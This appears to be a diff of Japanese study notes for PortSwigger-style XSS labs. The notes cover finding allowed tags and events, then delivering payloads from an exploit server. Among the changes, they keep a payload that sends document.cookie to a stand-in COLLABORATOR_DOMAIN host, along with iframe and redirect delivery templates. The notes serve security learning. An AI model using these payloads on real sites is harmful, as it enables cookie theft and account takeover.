@@ -109,27 +109,18 @@ GET /?search=<§§> HTTP/2
 ```
 
 2. 有効なイベントを割り出すため、cheat sheetのCopy events to clipboardをクリックし、ペースト（`%20` = 空白）
-
 ```http
 GET /?search=<有効なタグ%20§§=1> HTTP/2
 ```
 
-3. [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なペイロード候補を取得する
-    
-4. contextに合わせて改変したペイロードをエクスプロイトサーバにホストしてView Exploitで検証する
-    
-
-```html
-<iframe src="https://TARGET/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
-```
-
+3. 🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なペイロード候補を取得する
+  
 ### すべてのタグが禁止されている場合
 
-custom tagを使用してエクスプロイトサーバにホストし、deliverする：
-
+custom tagを使用してエクスプロイトサーバにホストし、deliverする
 ```html
 <script>
-    location = 'https://TARGET/?search=<xss+id=x+onfocus=document.location=\'https://COLLABORATOR_DOMAIN/?c=\'+document.cookie tabindex=1>#x';
+    location = 'https://<target_ip>/?search=<xss+id=x+onfocus=document.location=\'https://COLLABORATOR_DOMAIN/?c=\'+document.cookie tabindex=1>#x';
 </script>
 ```
 
@@ -397,11 +388,11 @@ ajaxRequest.send(params);
 
 ```html
 <!-- ユーザー操作不要 -->
-<iframe src="https://TARGET?<vuln_param>=<payload>">
+<iframe src="https://<target_ip>?<vuln_param>=<payload>">
 
 <!-- ユーザー操作が必要（iframeが禁止されているときに有効） -->
 <script>
-location = 'https://TARGET?<vuln_param>=<payload>'
+location = 'https://<target_ip>?<vuln_param>=<payload>'
 </script>
 ```
 
@@ -758,7 +749,7 @@ body:document.cookie
 2. need user interaction(iframeは禁止されているからこれでうまくいくことが多い)
 ```html
 <script>
-location = 'https://TARGET_NET?[vuln_param]=[payload]'
+location = 'https://<target_ip>?[vuln_param]=[payload]'
 </script>
 ```
 
